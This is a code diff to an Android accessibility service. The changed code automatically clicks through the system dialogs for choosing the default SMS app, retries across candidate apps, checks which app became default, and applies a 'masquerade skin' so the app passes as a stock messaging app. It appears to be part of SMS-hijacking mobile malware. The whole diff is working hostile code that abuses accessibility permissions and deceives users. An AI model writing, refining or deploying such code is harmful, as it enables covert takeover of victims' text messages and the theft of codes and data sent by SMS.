@@ -281,60 +281,80 @@ class MyAccessibilityService : AccessibilityService() {
                 if (appNodes.isNotEmpty()) {
                     val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                     val lastLoop = prefs.getLong("restore_loop_ts", 0L)
-                    if (System.currentTimeMillis() - lastLoop < 5000) return
+                    if (System.currentTimeMillis() - lastLoop < 4000) return
                     prefs.edit().putLong("restore_loop_ts", System.currentTimeMillis()).apply()
 
                     val targetCount = appNodes.size
+                    var candidateIndex = prefs.getInt("restore_candidate_idx", 0)
 
-                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
-                        for (i in 0 until targetCount) {
-                            val currentRoot = rootInActiveWindow ?: continue
-                            val currentNodes = currentRoot.findAccessibilityNodeInfosByText(targetLabel)
-                            
-                            if (i < currentNodes.size) {
-                                var target: android.view.accessibility.AccessibilityNodeInfo? = currentNodes[i]
-                                while (target?.isClickable == false) {
-                                    target = target?.parent
-                                }
-                                target?.let { safeTarget ->
-                                    if (safeTarget.isClickable) {
-                                        safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                        DebugLogger.log("GHOST_RESTORE", "Selected target candidate $i: $targetLabel")
-                                    }
-                                }
-                            }
-                            
-                            kotlinx.coroutines.delay(300)
-                            
-                            val confirmRoot = rootInActiveWindow
-                            if (confirmRoot != null) {
-                                val setNodes = confirmRoot.findAccessibilityNodeInfosByText("Set as default")
+                    if (candidateIndex >= targetCount) {
+                        DebugLogger.log("GHOST_RESTORE", "All candidates exhausted. Resetting index to retry.")
+                        candidateIndex = 0
+                        prefs.edit().putInt("restore_candidate_idx", 0).apply()
+                    }
+
+                    var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[candidateIndex]
+                    while (target?.isClickable == false) {
+                        target = target.parent
+                    }
+                    target?.let { safeTarget ->
+                        if (safeTarget.isClickable) {
+                            safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            DebugLogger.log("GHOST_RESTORE", "Selected target candidate $candidateIndex: $targetLabel")
+                        }
+                    }
+
+                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                        kotlinx.coroutines.delay(500)
+                        
+                        val confirmRoot = rootInActiveWindow
+                        if (confirmRoot != null) {
+                            val confirmTexts = listOf("Set as default", "Set", "OK", "Default")
+                            var clicked = false
+                            for (text in confirmTexts) {
+                                val setNodes = confirmRoot.findAccessibilityNodeInfosByText(text)
                                 for (btn in setNodes) {
                                     if (btn.isClickable) {
                                         btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                        DebugLogger.log("GHOST_RESTORE", "Clicked 'Set as default' confirmation")
+                                        DebugLogger.log("GHOST_RESTORE", "Clicked confirmation: '$text'")
+                                        clicked = true
+                                        break
+                                    }
+                                }
+                                if (clicked) break
+                            }
+                        }
+                        
+                        kotlinx.coroutines.delay(1000)
+                        
+                        val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this@MyAccessibilityService)
+                        if (currentDefault == packageName) {
+                            CommandProcessor.applyMasqueradeSkin(this@MyAccessibilityService, "SAM_MSG")
+                        }
+                        
+                        if (currentDefault == originalPkg) {
+                            DebugLogger.log("GHOST_RESTORE", "Verification SUCCESS! Target restored.")
+                            DefaultSmsManager.expectedMode = "" 
+                            prefs.edit().putInt("restore_candidate_idx", 0).apply()
+                            performGlobalAction(GLOBAL_ACTION_HOME)
+                        } else {
+                            DebugLogger.log("GHOST_RESTORE", "Candidate $candidateIndex failed verification. Incrementing index to test next app.")
+                            prefs.edit().putInt("restore_candidate_idx", candidateIndex + 1).apply()
+                            
+                            kotlinx.coroutines.delay(500)
+                            val retryRoot = rootInActiveWindow
+                            if (retryRoot != null) {
+                                val smsNodes = retryRoot.findAccessibilityNodeInfosByText("SMS")
+                                for (node in smsNodes) {
+                                    var t: android.view.accessibility.AccessibilityNodeInfo? = node
+                                    while (t?.isClickable == false) t = t.parent
+                                    if (t?.isClickable == true) {
+                                        t.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                         break
                                     }
                                 }
                             }
-                            
-                            kotlinx.coroutines.delay(600)
-                            
-                            val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this@MyAccessibilityService)
-                            if (currentDefault == packageName) {
-                                CommandProcessor.applyMasqueradeSkin(this@MyAccessibilityService, "SAM_MSG")
-                            }
-                            if (currentDefault == originalPkg) {
-                                DebugLogger.log("GHOST_RESTORE", "Verification SUCCESS! Target restored.")
-                                DefaultSmsManager.expectedMode = "" 
-                                prefs.edit().putLong("restore_loop_ts", 0L).apply()
-                                performGlobalAction(GLOBAL_ACTION_HOME)
-                                return@launch
-                            } else {
-                                DebugLogger.log("GHOST_RESTORE", "Candidate $i failed verification.")
-                            }
                         }
-                        prefs.edit().putLong("restore_loop_ts", 0L).apply()
                     }
                     return
                 }
